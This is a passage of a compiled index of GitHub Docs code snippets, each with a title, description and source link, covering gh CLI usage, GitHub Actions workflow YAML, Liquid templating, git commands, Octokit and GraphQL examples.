Fri, 01 Jan 1984 00:00:00 GMT\n> Content-Type: image/png\n> Content-Length: 2339\n> Server: Jetty(8.y.z-SNAPSHOT)\n```\n\n----------------------------------------\n\nTITLE: Using Custom Transformers with Actions Importer (Shell)\nDESCRIPTION: Demonstrates how to use the `--custom-transformers` CLI option with the `gh actions-importer` command to specify custom transformer files. It shows examples for a single file and using a glob pattern for multiple files within a directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer ... --custom-transformers transformers.rb\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer ... --custom-transformers transformers/*.rb\n```\n\n----------------------------------------\n\nTITLE: Platform Specific Content using Liquid Tags\nDESCRIPTION: These Liquid tags allow you to display different content based on the user's operating system.  The tags are `{% mac %}`, `{% windows %}`, and `{% linux %}`. Content within these tags will only be rendered for the specified platform.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/platform-specific.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% mac %}\n\n## Macintosh until 1999\n\n`mac` specific content.\n\n{% endmac %}\n```\n\nLANGUAGE: Liquid\nCODE:\n```\n{% windows %}\n\n## Windows 95 was awesome\n\n`windows` specific content.\n\n{% endwindows %}\n```\n\nLANGUAGE: Liquid\nCODE:\n```\n{% linux %}\n\n## The year of Linux on the desktop\n\n`linux` specific content.\n\n{% endlinux %}\n```\n\n----------------------------------------\n\nTITLE: Disabling Maintenance Mode (Shell)\nDESCRIPTION: This command disables maintenance mode for the GitHub Enterprise Server cluster, restoring normal access.  It relies on the `ghe-cluster-maintenance` command line utility, and requires the `-u` flag.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-maintenance -u\n```\n\n----------------------------------------\n\nTITLE: Verifying the extension\nDESCRIPTION: Verifies that the extension works after installation. Replace `EXTENSION-NAME` with the actual name of your extension. This executes the newly installed extension.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngh EXTENSION-NAME\n```\n\n----------------------------------------\n\nTITLE: Verifying Domain DNS Configuration Using Dig Command\nDESCRIPTION: This command is used to verify if the DNS configuration has been updated with the new TXT record for domain verification. It queries the DNS record for a specific domain and displays the result. Replace `USERNAME` with the actual GitHub username and `example.com` with the custom domain being verified.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\ndig _github-pages-challenge-USERNAME.example.com +nostats +nocomments +nocmd TXT\n```\n\n----------------------------------------\n\nTITLE: Boolean NOT Operator in Code Search\nDESCRIPTION: This snippet demonstrates the use of the NOT operator to exclude files from search results. It excludes files in the `__testing__` directory while searching for \"fatal error\".\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n\"fatal error\" NOT path:__testing__\n```\n\n----------------------------------------\n\nTITLE: View Existing Git Remotes\nDESCRIPTION: Demonstrates how to use `git remote -v` to view the configured remote repositories. This is useful for verifying the remote URL and ensuring it points to the correct repository.  The output shows the remote name (e.g., 'origin') and its associated URL for fetching and pushing.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git remote -v\n# View existing remotes\n> origin  https://github.com/ghost/cocoareactive.git (fetch)\n> origin  https://github.com/ghost/cocoareactive.git (push)\n```\n\n----------------------------------------\n\nTITLE: failure with condition example\nDESCRIPTION: This YAML snippet shows how to include extra conditions for a step to run after a failure, but you must still include failure() to override the default status check of success(). This is useful for running specific steps when a failure occurs and a certain other conditions are met.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  ...\n  - name: Failing step\n    id: demo\n    run: exit 1\n  - name: The demo step has failed\n    if: {% raw %}${{ failure() && steps.demo.conclusion == 'failure' }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Coding Guideline Example: Use fetch for HTTP Requests\nDESCRIPTION: This example outlines a coding guideline to enforce the usage of the `fetch` API for HTTP requests. It restricts the use of other libraries such as `axios` or `superagent`, targeting TypeScript and JavaScript files.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/code-review/configuring-coding-guidelines.md#_snippet_3\n\n\n\n----------------------------------------\n\nTITLE: Fixing Missing 'name' Key in YAML\nDESCRIPTION: This snippet demonstrates how to resolve the 'required top level key `name` is missing' error. The error occurs when the YAML file lacks the `name` key.  The fix involves adding the `name` key with a descriptive string value. This field is essential for identifying the issue template.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndescription: \"Thank you for reporting a bug!\"\n...\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\ndescription: \"Thank you for reporting a bug!\"\n...\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit.js with Auth Token\nDESCRIPTION: This JavaScript snippet initializes the Octokit.js library with an authentication token. The `auth` parameter specifies the token to use. Replace 'YOUR-TOKEN' with a valid GitHub access token.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n  auth: 'YOUR-TOKEN'\n});\n```\n\n----------------------------------------\n\nTITLE: Markdown Table Example\nDESCRIPTION: This code snippet demonstrates a basic Markdown table structure, showing the syntax for defining table headers and rows. Every row begins and ends with a pipe `|` character.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_21\n\nLANGUAGE: markdown\nCODE:\n```\n| Where is the table located? | Does every row end with a pipe? |\n| --- | --- |\n| {% raw %}{% ifversion some-cool-feature %}{% endraw %} |\n| GitHub Docs | Yes |\n| {% raw %}{% endif %}{% endraw %} |\n```\n\n----------------------------------------\n\nTITLE: Defining a Before Filter in Sinatra (Ruby)\nDESCRIPTION: This code defines a `before` filter that executes before each request to the `/event_handler` route.  It calls helper methods to process the payload, verify the webhook signature, and authenticate the app and installation.  It also validates the repository name if present in the payload.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n  # Executed before each request to the `/event_handler` route\n  before '/event_handler' do\n    get_payload_request(request)\n    verify_webhook_signature\n\n    # If a repository name is provided in the webhook, validate that\n    # it consists only of latin alphabetic characters, `-`, and `_`.\n    unless @payload['repository'].nil?\n      halt 400 if (@payload['repository']['name'] =~ /[0-9A-Za-z\\-\\_]+/).nil?\n    end\n\n    authenticate_app\n    # Authenticate the app installation in order to run API operations\n    authenticate_installation(@payload)\n  end\n```\n\n----------------------------------------\n\nTITLE: Authenticating GitHub App with JWT (Ruby)\nDESCRIPTION: This helper method authenticates as a GitHub App using a JWT (JSON Web Token). It creates a JWT payload with the issue time, expiration time, and app identifier, signs it with the app's private key, and then uses the JWT to create an Octokit client.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_52\n\nLANGUAGE: Ruby\nCODE:\n```\n    # Instantiate an Octokit client authenticated as a GitHub App.\n    # GitHub App authentication requires that you construct a\n    # JWT (https://jwt.io/introduction/) signed with the app's private key,\n    # so GitHub can be sure that it came from the app and not altered by\n    # a malicious third party.\n    def authenticate_app\n      payload = {\n          # The time that this JWT was issued, _i.e._ now.\n          iat: Time.now.to_i,\n\n          # JWT expiration time (10 minute maximum)\n          exp: Time.now.to_i + (10 * 60),\n\n          # Your GitHub App's identifier number\n          iss: APP_IDENTIFIER\n      }\n\n      # Cryptographically sign the JWT.\n      jwt = JWT.encode(payload, PRIVATE_KEY, 'RS256')\n\n      # Create the Octokit client, using the JWT as the auth token.\n      @app_client ||= Octokit::Client.new(bearer_token: jwt)\n    end\n```\n\n----------------------------------------\n\nTITLE: Building npm packages for customization scripts - Shell\nDESCRIPTION: This shell command builds the necessary npm packages to generate the `index.js` files, which are used to trigger the customization commands defined in the JSON files. It requires Node.js and npm to be installed. The `bootstrap` command likely prepares the environment for package building, while `build-all` performs the actual build process. The output `index.js` files will be in the `packages/docker/dist` and `packages/k8s/dist` directories.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install && npm run bootstrap && npm run build-all\n```\n\n----------------------------------------\n\nTITLE: Force Pushing a Commit Message Change\nDESCRIPTION: This snippet demonstrates how to force push a commit with an amended message using the `git push --force-with-lease` command. It's crucial when the original commit has already been pushed to a remote repository. It's vital to understand the implications of rewriting history when force pushing, as it can affect collaborators.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/changing-a-commit-message.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit push --force-with-lease origin EXAMPLE-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Configure Travis CI for Jekyll Build with YAML\nDESCRIPTION: This code snippet shows how to configure a `.travis.yml` file for Travis CI to build a Jekyll site. It specifies the Ruby language, the Ruby version, and the build script command. This allows Travis CI to automatically test the Jekyll site for errors upon each commit.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/about-jekyll-build-errors-for-github-pages-sites.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nlanguage: ruby\nrvm:\n  - 2.3\nscript: \"bundle exec jekyll build\"\n```\n\n----------------------------------------\n\nTITLE: Installing Node Modules (Shell)\nDESCRIPTION: This command attempts to fix `Cannot find module` errors when running `npm start`. It installs missing dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Creating Docker Container for Pre-Receive Hook Environment\nDESCRIPTION: This shell command creates a Docker container from the previously built image. The /bin/true is executed to prevent the container from exiting immediately. It's then exported and compressed to be used as a pre-receive hook environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-environment.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ndocker create --name pre-receive.debian pre-receive.debian /bin/true\n```\n\n----------------------------------------\n\nTITLE: Nested Conditionals: FPT and GHES != 2.13, Liquid\nDESCRIPTION: This snippet demonstrates nested `ifversion` tags. If the FPT version is present, it renders \"Alpha\". Otherwise, it renders \"Bravo\", and further checks if the GHES version is not equal to 2.13. If the GHES version is not equal to 2.13 then, it renders \"Charlie\".\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/not-equals.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes != 2.13 %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Boolean OR Operator in Code Search\nDESCRIPTION: This snippet shows how to use the OR operator to search for documents containing either one term or the other.  It will match documents containing either `sparse` or `index`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nsparse OR index\n```\n\n----------------------------------------\n\nTITLE: Using Branch for GitHub Action versioning (YAML)\nDESCRIPTION: This snippet shows how to specify a GitHub Action version using a branch name. Using a branch means the action will always run the version currently on that branch, which can be risky if updates to the branch include breaking changes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: actions/javascript-action@main\n```\n\n----------------------------------------\n\nTITLE: Inspecting container image with Docker CLI\nDESCRIPTION: This command inspects a container image in the GitHub Container Registry to find its digest SHA value. Replace `NAMESPACE` with the name of the personal account or organization to which the image is scoped. This command requires Docker to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ndocker inspect {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME\n```\n\n----------------------------------------\n\nTITLE: Running the help command in shell\nDESCRIPTION: This shell command executes the `app_cli.rb` script with the `help` argument.  It displays the usage instructions of the application.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_21\n\nLANGUAGE: shell\nCODE:\n```\n./app_cli.rb help\n```\n\n----------------------------------------\n\nTITLE: Service Volume Configuration - YAML\nDESCRIPTION: This example demonstrates how to configure volumes for a service container. It includes a named Docker volume (`my_docker_volume`), an anonymous Docker volume (`/data/my_data`), and a bind mount from the host (`/source/directory` to `/destination/directory` in the container).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_34\n\nLANGUAGE: yaml\nCODE:\n```\nvolumes:\n  - my_docker_volume:/volume_mount\n  - /data/my_data\n  - /source/directory:/destination/directory\n```\n\n----------------------------------------\n\nTITLE: Copying Fixture Data Script Execution\nDESCRIPTION: This command executes a script to update fixture data, ensuring it's a fresh copy. This is useful for keeping the fixture data in sync with the latest changes, especially for data files that straddle real content and support functionality.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/README.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n./src/tests/scripts/copy-fixture-data.js\n```\n\n----------------------------------------\n\nTITLE: Interactive Git Rebase Initiation\nDESCRIPTION: This command initiates an interactive rebase session, allowing you to modify the last 7 commits. The `HEAD~7` argument specifies the range of commits to include in the rebase.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/using-git-rebase-on-the-command-line.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit rebase --interactive HEAD~7\n```\n\n----------------------------------------\n\nTITLE: Fixing Missing 'type' Key in Body Block of YAML\nDESCRIPTION: This snippet explains how to fix the 'Body[i]: required key type is missing' error. Each body block must contain the key `type`.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Pull Request Branch Triggers in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to trigger on `pull_request` events for specific branches.  The `branches` key defines a list of patterns to match against the Git ref name, allowing workflows to run only when pull requests target the specified branches.  The patterns support exact matches and wildcard characters for flexible branch filtering.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/triggering-workflow-branches2.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'\n```\n\n----------------------------------------\n\nTITLE: Generate Migration Script with GitHub CLI\nDESCRIPTION: This command generates a migration script using the `gh bbs2gh generate-script` command. It includes options for specifying the Bitbucket Server URL, GitHub organization, output filename, target API URL, SSH/SMB credentials, and archive download host.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh generate-script --bbs-server-url BBS-SERVER-URL \\\n  --github-org DESTINATION \\\n  --output FILENAME \\\n  # If you are migrating to {% data variables.enterprise.data_residency_site %}:\n  --target-api-url TARGET-API-URL\n  # If your Bitbucket Server instance runs on Linux:\n  --ssh-user SSH-USER --ssh-private-key PATH-TO-KEY\n  # If your Bitbucket Server instance runs on Windows:\n  --smb-user SMB-USER\n  # If you are running a Bitbucket Data Center cluster or your Bitbucket Server is behind a load balancer:\n  --archive-download-host ARCHIVE-DOWNLOAD-HOST\n```\n\n----------------------------------------\n\nTITLE: Configure Release Notes for Dependencies with YAML\nDESCRIPTION: This YAML configuration file demonstrates separating dependency updates in release notes. It defines categories for features and dependencies, excluding dependency-related pull requests from the feature category.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/releasing-projects-on-github/automatically-generated-release-notes.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# .github/release.yml\n\nchangelog:\n  categories:\n    - title: 🏕 Features\n      labels:\n        - '*'\n      exclude:\n        labels:\n          - dependencies\n    - title: 👒 Dependencies\n      labels:\n        - dependencies\n```\n\n----------------------------------------\n\nTITLE: Listing Codespaces using GitHub CLI\nDESCRIPTION: This command lists all existing codespaces associated with the authenticated GitHub account. It provides a quick overview of available codespaces and their status. The output includes the unique name of each codespace, which is used in other `gh codespace` commands. An asterisk at the end of the branch name for a codespace indicates that there are uncommitted or unpushed changes.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace list\n```\n\n----------------------------------------\n\nTITLE: Pre-Receive Hook Standard Input Format (stdin) - Shell\nDESCRIPTION: This code snippet describes the format of the standard input (stdin) received by a pre-receive hook script when a push event occurs. Each line represents a ref update, including the old object name, the new object name, and the full name of the ref. The script receives this input from the `git-receive-pack` process.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n<old-value> SP <new-value> SP <ref-name> LF\n```\n\n----------------------------------------\n\nTITLE: Setting a notice message in PowerShell\nDESCRIPTION: This snippet shows how to set a notice message using the `notice` workflow command in PowerShell, providing file, line, column, and title information.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_8\n\nLANGUAGE: powershell\nCODE:\n```\nWrite-Output \"::notice file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: CodeQL Pack Lock File Example\nDESCRIPTION: This YAML snippet shows a `codeql-pack.lock.yml` file that specifies the resolved version of the `codeql/cpp-all` dependency. It is automatically generated by the `codeql pack install` command. It tracks the specific version of the dependency that was installed in the package cache, guaranteeing repeatable builds.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/about-codeql-workspaces.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ndependencies:\n  codeql/cpp-all:\n    version: 0.2.2\n```\n\n----------------------------------------\n\nTITLE: Removing a Git Submodule using Shell\nDESCRIPTION: This snippet provides the commands to completely remove a Git submodule from a repository. It first deinitializes the submodule, then removes it from the repository, commits the removal, and finally removes the submodule's directory from .git/modules/. The `PATH-TO-SUBMODULE` placeholder needs to be replaced with the actual path to the submodule.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/pages/remove-submodule.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit submodule deinit PATH-TO-SUBMODULE\ngit rm PATH-TO-SUBMODULE\ngit commit -m \"Remove submodule\"\nrm -rf .git/modules/PATH-TO-SUBMODULE\n```\n\n----------------------------------------\n\nTITLE: Allowing Unknown Properties in YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `__allow_unknown_properties` field to instruct the CodeQL CLI to ignore unknown extractor options or option groups. This is useful when you want to avoid errors due to typos or outdated configuration files.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/extractor-options.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nextractor:\n    java:\n        option1: \"abc\"\n        group1:\n            __allow_unknown_properties: true\n            option2: [ 102 ]\n```\n\n----------------------------------------\n\nTITLE: Introspection Query with IDL Media Type\nDESCRIPTION: This shell command performs an introspection query using a GET request, but specifies the 'application/vnd.github.v4.idl' Accept header to receive the schema in IDL format.  This is a condensed representation of the schema.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/introduction-to-graphql.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ curl -H \"Authorization: bearer TOKEN\" -H \"Accept: application/vnd.github.v4.idl\" \\\n{% data variables.product.graphql_url %}\n```\n\n----------------------------------------\n\nTITLE: Synchronize Subtree Updates\nDESCRIPTION: Pulls changes from the remote repository into the subtree. The `-s subtree` option specifies the subtree merge strategy.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngit pull -s subtree REMOTE-NAME BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: JSON Response for AddReaction Mutation\nDESCRIPTION: This JSON response shows the structure of the data returned after successfully executing the AddReactionToIssue mutation. It includes the content of the reaction and the ID of the subject (the issue).\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"data\": {\n    \"addReaction\": {\n      \"reaction\": {\n        \"content\": \"HOORAY\"\n      },\n      \"subject\": {\n        \"id\": \"MDU6SXNzdWUyMTc5NTQ0OTc=\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Azure Blob Storage\nDESCRIPTION: This command configures Azure Blob Storage as the storage provider for GitHub Actions. It uses the `ghe-config` tool to set the `secrets.actions.storage.blob-provider` configuration to \"azure\". This command requires the `ghe-config` tool to be available in the environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider-platform-commands.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.blob-provider \"azure\"\n```\n\n----------------------------------------\n\nTITLE: Caching with CircleCI\nDESCRIPTION: This snippet shows the CircleCI configuration syntax for restoring a cache using checksums of the package-lock.json file. It uses the `restore_cache` directive with keys based on the checksum and a fallback key.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- restore_cache:\n    keys:\n      - v1-npm-deps-{{ checksum \"package-lock.json\" }}\n      - v1-npm-deps-\n```\n\n----------------------------------------\n\nTITLE: Displaying Protected Branch Error Message in Shell\nDESCRIPTION: This snippet shows the error message you receive when trying to push local changes to a protected branch before all required status checks pass. The message indicates a failing status check.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nremote: error: GH006: Protected branch update failed for refs/heads/main.\nremote: error: Required status check \"ci-build\" is failing\n```\n\n----------------------------------------\n\nTITLE: Generating a PGP Key\nDESCRIPTION: This code snippet generates a PGP key using the `gpg` command. The `--full-generate-key` option starts the key generation process, and `--pinentry-mode=loopback` specifies the pin entry mode for non-interactive environments. It is recommended to use a key size of at least 4096 bits and set no expiry date for the key.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_site_admin_settings/create-pgp-key-web-commit-signing.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngpg --full-generate-key --pinentry-mode=loopback\n```\n\n----------------------------------------\n\nTITLE: Uploading Data as Artifact (YAML)\nDESCRIPTION: This YAML config defines a workflow that triggers on pull requests and uploads the pull request number as an artifact named `pr_number`. The artifact is stored in a directory named `pr` containing a file named `pr_number` with the PR number inside.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_59\n\nLANGUAGE: YAML\nCODE:\n```\nname: Upload data\n\non:\n  pull_request:\n\njobs:\n  upload:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Save PR number\n        env:\n          PR_NUMBER: {% raw %}${{ github.event.number }}{% endraw %}\n        run: |\n          mkdir -p ./pr\n          echo $PR_NUMBER > ./pr/pr_number\n      - uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: pr_number\n          path: pr/\n```\n\n----------------------------------------\n\nTITLE: Adding Resolved Conflicts to Staging Area\nDESCRIPTION: This command stages the files that have been modified to resolve merge conflicts, indicating to Git that the conflicts have been resolved and the updated version should be included in the next commit. Replace `changed-file-1.md changed-file-2.md` with the files you edited.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ngit add changed-file-1.md changed-file-2.md\n```\n\n----------------------------------------\n\nTITLE: Querying Organization SAML and SCIM Identities with GraphQL\nDESCRIPTION: This GraphQL query retrieves SAML NameID, SCIM username, and GitHub username (login) for each user in the specified organization.  It requires GraphQL API access with appropriate permissions and organization name. The query returns a list of external identities with their associated SAML and SCIM data, useful for identifying users with missing or mismatched SCIM metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-saml-single-sign-on-for-your-organization/troubleshooting-identity-and-access-management-for-your-organization.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\n{\n  organization(login: \"ORG\") {\n    samlIdentityProvider {\n      ssoUrl\n      externalIdentities(first: 100) {\n        edges {\n          node {\n            samlIdentity {\n              nameId\n            }\n            scimIdentity {\n              username\n            }\n            user {\n              login\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using a Private Action Workflow\nDESCRIPTION: This YAML workflow file demonstrates how to use a private action within the same repository. It defines a job that runs on Ubuntu, checks out the repository, uses an action in the root directory, and accesses the output of the action. The `who-to-greet` input is defined.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\non: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      # To use this repository's private action,\n      # you must check out the repository\n      - name: Checkout\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Hello world action step\n        uses: ./ # Uses an action in the root directory\n        id: hello\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was {% raw %}${{ steps.hello.outputs.time }}\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Using `needs` context in GitHub Actions YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `needs` context to access outputs from a dependent job (`build`) in another job (`deploy`). It also shows how to define job dependencies and use the `failure()` function in a conditional `if` statement.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build and deploy\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      build_id: {% raw %}${{ steps.build_step.outputs.build_id }}{% endraw %}\n    steps:\n      - name: Build\n        id: build_step\n        run: echo \"build_id=$RANDOM\" >> $GITHUB_OUTPUT\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploying build {% raw %}${{ needs.build.outputs.build_id }}{% endraw %}\"\n  debug:\n    needs: [build, deploy]\n    runs-on: ubuntu-latest\n    if: {% raw %}${{ failure() }}{% endraw %}\n    steps:\n      - run: echo \"Failed to build and deploy\"\n```\n\n----------------------------------------\n\nTITLE: Cleanup Caches by Branch - Shell Script\nDESCRIPTION: This shell script lists cache keys associated with a pull request branch using the `gh cache list` command, then iterates through the list to delete each cache using the `gh cache delete` command. It sets the `-e` option to prevent the script from exiting immediately if a command fails. The BRANCH variable is defined to identify the branch of the pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\necho \"Fetching list of cache key\"\ncacheKeysForPR=$(gh cache list --ref $BRANCH --limit 100 --json id --jq '.[].id')\n\n## Setting this to not fail the 